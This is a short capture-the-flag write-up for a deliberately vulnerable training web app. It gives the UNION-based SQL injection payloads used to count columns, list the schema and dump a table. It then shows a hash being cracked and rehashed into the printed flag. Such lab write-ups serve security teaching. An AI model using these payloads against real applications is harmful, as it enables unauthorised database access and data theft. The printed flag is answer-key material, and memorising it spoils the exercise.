# SQL Injection to Retrieve and Decode a Flag

## Step 1: Determine the Number of Columns
We tested the application with a SQL injection payload to find out how many columns the query returned:

1 OR 1=1 UNION SELECT NULL, NULL--


## Step 2: Identify Columns in the `list_images` Table
Next, we wanted to know the column names in the target database table `list_images`. We used:

1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns


## Step 3: Extract All Images Data
With the column names known, we combined them to see the data stored in the table:

1 AND 1=2 UNION SELECT id, CONCAT(url, title, comment) FROM list_images


Result (example):

borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46


## Step 4: Decoding the Flag
The message instructed to decode the hash using the following steps:

1. **MD5 Decrypt:** 

md5_decrypt('1928e8083cf461a51303633093573c46') => albatroz


2. **Convert to Lowercase:**  

lower('albatroz') => albatroz


3. **SHA256 Hash:**  

sha256('albatroz') => f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

## Explanation
This attack used SQL injection to discover table structure, extract sensitive data, and then followed the provided instructions to decode a hash and obtain the flag.